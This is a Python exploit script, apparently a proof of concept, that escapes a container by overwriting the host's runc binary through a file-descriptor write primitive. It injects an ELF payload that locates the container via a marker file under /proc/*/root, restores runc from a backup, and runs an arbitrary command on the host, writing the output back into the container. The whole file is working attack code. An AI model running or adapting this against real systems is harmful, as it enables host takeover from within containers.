#!/usr/bin/env python3
import os
import shlex
import sys

from copyfail_primitive import copy_fail_fd
from elf_payloads import host_cmd_payload, native_arch, normalize_arch


def round4(n):
    return (n + 3) & ~3


if len(sys.argv) < 5:
    raise SystemExit(f"usage: {sys.argv[0]} RUNC_FD CONTAINER_OUT MARKER_PATH MARKER_TOKEN [host-command [args...]]")

runc_fd_path = sys.argv[1]
out = sys.argv[2]
marker = sys.argv[3]
token = sys.argv[4]
argv = sys.argv[5:]
work = os.path.dirname(os.path.abspath(out))
backup = os.path.join(work, "runc.orig")
helper = os.path.abspath(os.environ.get("DCF_COPYFAIL_HELPER", os.path.join(work, "copyfail_write")))
try:
    runc_target = os.readlink(runc_fd_path).removesuffix(" (deleted)")
except OSError:
    runc_target = "/runc"
if not runc_target.startswith("/"):
    raise SystemExit(f"unexpected non-absolute runc path: {runc_target}")

if argv:
    host_command = shlex.join(argv)
else:
    host_command = "hostname"

qout = shlex.quote(out)
qmarker = shlex.quote(marker)
qtoken = shlex.quote(token)
qbackup = shlex.quote(backup)
qhelper = shlex.quote(helper)
qtarget = shlex.quote(runc_target)
cmd = (
    f"c_out={qout}; "
    f"c_marker={qmarker}; "
    f"c_token={qtoken}; "
    f"c_backup={qbackup}; "
    f"c_helper={qhelper}; "
    f"c_target={qtarget}; "
    f"root=; "
    f"out=; "
    f"for r in /proc/[0-9]*/root; do "
    f"if [ -r \"$r$c_marker\" ] && [ \"$(cat \"$r$c_marker\" 2>/dev/null)\" = \"$c_token\" ]; then "
    f"root=\"$r\"; out=\"$r$c_out\"; break; "
    f"fi; "
    f"done; "
    f"[ -n \"$root\" ] || exit 111; "
    f"rm -f \"$out\" \"$out.done\"; "
    f"restore_log=\"$out.restore\"; "
    f"runc_fd=\"/proc/$$/fd/9\"; "
    f"if [ ! -r \"$runc_fd\" ] && [ -r \"$c_target\" ]; then runc_fd=\"$c_target\"; fi; "
    f"\"$root$c_helper\" \"$runc_fd\" 0 \"$root$c_backup\" > \"$restore_log\" 2>&1; "
    f"restore_rc=$?; "
    f"cat \"$restore_log\" >> \"$out\" 2>/dev/null; "
    f"rm -f \"$restore_log\"; "
    f"printf '[restore=%d]\\n' \"$restore_rc\" >> \"$out\"; "
    f"if [ \"$restore_rc\" -eq 0 ]; then "
    f"( {host_command} ) >> \"$out\" 2>&1; "
    f"rc=$?; "
    f"else rc=\"$restore_rc\"; fi; "
    f"printf '\\n[exit=%d]\\n' \"$rc\" >> \"$out\"; "
    f"chmod 644 \"$out\"; "
    f"printf '%s\\n' \"$rc\" > \"$out.done\"; "
    f"chmod 644 \"$out.done\""
)
arch = normalize_arch(os.environ.get("DCF_PAYLOAD_ARCH") or native_arch())
payload = host_cmd_payload(cmd, arch)
backup_len = round4(len(payload))
fd = os.open(runc_fd_path, os.O_RDONLY)
try:
    original = os.pread(fd, backup_len, 0)
    if len(original) != backup_len:
        raise SystemExit(f"short read while backing up runc: got {len(original)} want {backup_len}")
    with open(backup, "wb") as f:
        f.write(original)
    os.chmod(backup, 0o644)
    print(
        f"patching {runc_fd_path} target={runc_target} arch={arch} payload={len(payload)} backup={backup_len} "
        f"out=/proc/*/root{out} command={host_command}",
        flush=True,
    )
    copy_fail_fd(fd, payload)
finally:
    os.close(fd)
print("done", flush=True)
